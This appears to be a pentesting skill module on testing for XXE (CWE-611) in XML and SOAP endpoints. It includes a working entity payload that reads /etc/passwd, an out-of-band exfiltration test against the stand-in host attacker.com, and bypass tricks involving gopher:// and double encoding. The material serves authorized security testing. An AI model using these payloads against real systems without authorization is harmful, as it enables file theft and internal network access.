
name: cwe-611-xxe
description: Use when an XML/SOAP/upload endpoint fetches an entity/file.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-611, misconfiguration, pentest, owasp, a02]
category: pentesting-skills
related_skills:
  - owasp-a02-security-misconfiguration
---

# CWE-611 - Improper Restriction of XML External Entity Reference (XXE)

CWE-611: Improper Restriction of XML External Entity Reference (XXE) - the application parses XML and allows an external entity reference to reach a local file or network resource.

## Parent Skill

This is a sub-skill of `owasp-a02-security-misconfiguration` (OWASP A02 Security Misconfiguration, Top 10 2025).
Load the parent for overall A02 scope, validation criteria (negative control), and
the reporting template. This skill covers the CWE-611 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- Use when an XML/SOAP/upload endpoint can be made to fetch an external entity or file.

## Detection & Test

1. On every XML/SOAP/upload endpoint, send an external entity (`<entity systemId="file:///etc/passwd">`).
2. Confirm the server reads the file and returns its content.
3. Test an out-of-band exfiltration (`http://attacker.com/`) to prove a blind XXE.
4. Check the response for the file's content or a reference to the `systemId`.

## Example Requests

```http
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```
```http
POST /soap (XXE payload)
```

## Bypass Tricks

- Bypass a `DOCTYPE` filter with a double-encoded entity.
- Use a `file://` entity to read `/etc/passwd`.
- Exploit a `http://` entity to make an outbound request (OOB).
- Use a `gopher://` entity to hit an internal service.
- Bypass a parser that only checks the root element with a nested entity.

## Impact

- Read arbitrary local files or make outbound requests via the XML parser.

## See Also

- `owasp-a02-security-misconfiguration` - parent skill (A02 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).